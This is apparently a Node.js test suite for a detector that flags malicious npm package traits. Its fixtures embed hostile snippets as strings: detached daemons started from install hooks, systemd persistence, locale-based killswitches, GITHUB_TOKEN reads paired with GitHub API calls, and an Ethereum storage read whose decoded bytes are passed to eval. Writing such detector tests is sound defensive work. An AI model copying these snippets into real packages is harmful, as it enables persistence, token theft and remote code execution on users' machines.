import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/msh-supplement/index.js';

test('MSH-SUP: ctf-scramble-v2 require pattern triggers stop condition', async () => {
  const files = [{ path: 'dist/bundle.js', content: 'const x = require("ctf-scramble-v2");' }];
  const findings = await scan({ name: 'test-pkg', version: '1.0.0' }, [], null, files);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, 'critical');
  assert.ok(findings[0].stopCondition);
  const ev = JSON.parse(findings[0].evidence);
  assert.equal(ev.rule, 'MSH-OBF-001');
  assert.ok(ev.triggeredChecks.includes('D1'));
});

test('MSH-SUP: ctf-scramble-v2 import pattern triggers stop condition', async () => {
  const files = [{ path: 'src/index.js', content: 'import "ctf-scramble-v2";' }];
  const findings = await scan({ name: 'test-pkg', version: '1.0.0' }, [], null, files);
  assert.equal(findings.length, 1);
  assert.ok(findings[0].stopCondition);
});

test('MSH-SUP: ctf-scramble-v3 variant triggers stop condition', async () => {
  const files = [{ path: 'lib/obf.js', content: 'const x = require("ctf-scramble-v3");' }];
  const findings = await scan({ name: 'test-pkg', version: '1.0.0' }, [], null, files);
  assert.equal(findings.length, 1);
  assert.ok(findings[0].stopCondition);
});

test('MSH-SUP: clean files produce no findings', async () => {
  const files = [{ path: 'index.js', content: 'module.exports = 42;' }];
  const findings = await scan(
    { name: 'clean-pkg', version: '1.0.0', scripts: { test: 'node test.js' } },
    files
  );
  assert.equal(findings.length, 0);
});

test('MSH-SUP: daemonization detection triggers D2', async () => {
  const files = [
    {
      path: 'install.js',
      content: `if (!process.env.CI) { require('child_process').spawn('node', ['server.js'], { detached: true }); }`,
    },
  ];
  const pkgJson = {
    name: 'evil-pkg',
    version: '2.0.0',
    scripts: { postinstall: 'node install.js' },
  };
  const findings = await scan(pkgJson, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D2'));
  assert.ok(ev.details.D2.hasCiGuard);
  assert.ok(ev.details.D2.detectedApis.includes('spawn_detached'));
});

test('MSH-SUP: fork without CI guard triggers D2', async () => {
  const files = [{ path: 'setup.js', content: 'daemon({ stdout: "/dev/null" });' }];
  const pkgJson = { name: 'test-pkg', version: '1.0.0', scripts: { install: 'node setup.js' } };
  const findings = await scan(pkgJson, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D2'));
  assert.ok(ev.details.D2.detectedApis.includes('daemon'));
});

test('MSH-SUP: systemd persistence triggers D2', async () => {
  const files = [
    { path: 'evil.js', content: 'fs.writeFileSync("/etc/systemd/system/evil.service", "...");' },
  ];
  const pkgJson = { name: 'test-pkg', version: '1.0.0', scripts: { postinstall: 'node evil.js' } };
  const findings = await scan(pkgJson, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D2'));
  assert.ok(ev.details.D2.detectedApis.includes('systemd'));
});

test('MSH-SUP: geographic killswitch ru_RU triggers D3', async () => {
  const files = [
    {
      path: 'index.js',
      content: `if (process.env.LANG && process.env.LANG.includes('ru_RU')) process.exit(0);`,
    },
  ];
  const findings = await scan({ name: 'test-pkg', version: '1.0.0' }, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3'));
  assert.ok(ev.details.D3.targetedLocales.includes('ru_RU'));
});

test('MSH-SUP: geographic killswitch Intl.DateTimeFormat triggers D3', async () => {
  const files = [
    {
      path: 'index.js',
      content: `const tz = Intl.DateTimeFormat().resolvedOptions().timeZone; if (tz === 'Europe/Minsk') process.exit(0);`,
    },
  ];
  const findings = await scan({ name: 'test-pkg', version: '1.0.0' }, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3'));
});

test('MSH-SUP: geographic killswitch be_BY triggers D3', async () => {
  const files = [
    {
      path: 'index.js',
      content: `if (Intl.DateTimeFormat().resolvedOptions().timeZone.includes('Minsk')) process.exit(0);`,
    },
  ];
  const findings = await scan({ name: 'test-pkg', version: '1.0.0' }, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3'));
  assert.ok(ev.details.D3.targetedLocales.includes('be_BY'));
});

test('MSH-SUP: locale check without target country = no D3', async () => {
  const files = [
    {
      path: 'index.js',
      content: `if (process.env.LANG && process.env.LANG.includes('en_US')) process.exit(0);`,
    },
  ];
  const findings = await scan({ name: 'test-pkg', version: '1.0.0' }, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3'));
});

test('MSH-SUP: C2 dead-drop OhNoWhatsGoingOnWithGitHub triggers D4', async () => {
  const files = [{ path: 'index.js', content: `const keyword = 'OhNoWhatsGoingOnWithGitHub';` }];
  const findings = await scan({ name: 'test-pkg', version: '1.0.0' }, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D4'));
  assert.ok(ev.details.D4.matches.some((m) => m.type === 'ioc_keyword'));
});

test('MSH-SUP: token access + GitHub API triggers D4', async () => {
  const files = [
    {
      path: 'grab.js',
      content: `const token = process.env.GITHUB_TOKEN; fetch('https://api.github.com/repos/owner/repo/commits');`,
    },
  ];
  const findings = await scan({ name: 'test-pkg', version: '1.0.0' }, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D4'));
  assert.ok(ev.details.D4.matches.some((m) => m.type === 'token_exfil_github_api'));
});

test('MSH-SUP: on-chain dead-drop (EtherHiding/NullReceiver) triggers D4', async () => {
  const files = [
    {
      path: 'drop.js',
      content: `const { ethers } = require('ethers');
const provider = new ethers.JsonRpcProvider('https://mainnet.infura.io/v3/KEY');
const raw = await provider.send('eth_getStorageAt', ['0x1234567890123456789012345678901234567890', slot]);
eval(Buffer.from(raw.slice(2), 'hex').toString());`,
    },
  ];
  const findings = await scan({ name: 'test-pkg', version: '1.0.0' }, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D4'));
  assert.ok(ev.details.D4.matches.some((m) => m.type === 'blockchain_dead_drop'));
});

test('MSH-SUP: high-level ethers.js balance read is not a dead-drop', async () => {
  const files = [
    {
      path: 'wallet.js',
      content: `const { ethers } = require('ethers'); const bal = await provider.getBalance(addr);`,
    },
  ];
  const findings = await scan({ name: 'test-pkg', version: '1.0.0' }, files);
  assert.equal(findings.length, 0);
});

test('MSH-SUP: multiple signals trigger at once', async () => {
  const files = [
    {
      path: 'a.js',
      content: `if (process.env.LANG && process.env.LANG.includes('ru_RU')) process.exit(0);`,
    },
    {
      path: 'b.js',
      content: `const token = process.env.GH_TOKEN; fetch('https://api.github.com/graphql');`,
    },
  ];
  const pkgJson = { name: 'multi-pkg', version: '1.0.0', scripts: { postinstall: 'node a.js' } };
  const findings = await scan(pkgJson, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3'));
  assert.ok(ev.triggeredChecks.includes('D4'));
});

test('MSH-SUP: provenance metadata attached to findings', async () => {
  const files = [{ path: 'dist/bundle.js', content: 'require("ctf-scramble-v2");' }];
  const findings = await scan({ name: 'test-pkg', version: '1.0.0' }, [], null, files);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev._provenance);
  assert.equal(ev._provenance.detection_rule.rule_id, 'MSH-OBF-001');
  assert.ok(ev._provenance.scan_metadata.package_analyzed.includes('test-pkg'));
  assert.ok(ev._provenance.audit_trail.hmac_signature);
});

test('MSH-SUP: clean package with benign code = no findings', async () => {
  const files = [{ path: 'index.js', content: 'console.log("hello");' }];
  const pkgJson = { name: 'benign', version: '1.0.0', scripts: { test: 'node test.js' } };
  const findings = await scan(pkgJson, files);
  assert.equal(findings.length, 0);
});

test('MSH-SUP: spawn without detached flag = no D2 finding', async () => {
  const files = [
    { path: 'index.js', content: 'require("child_process").spawn("node", ["build.js"]);' },
  ];
  const pkgJson = { name: 'clean-pkg', version: '1.0.0' };
  const findings = await scan(pkgJson, files);
  assert.equal(findings.length, 0);
});
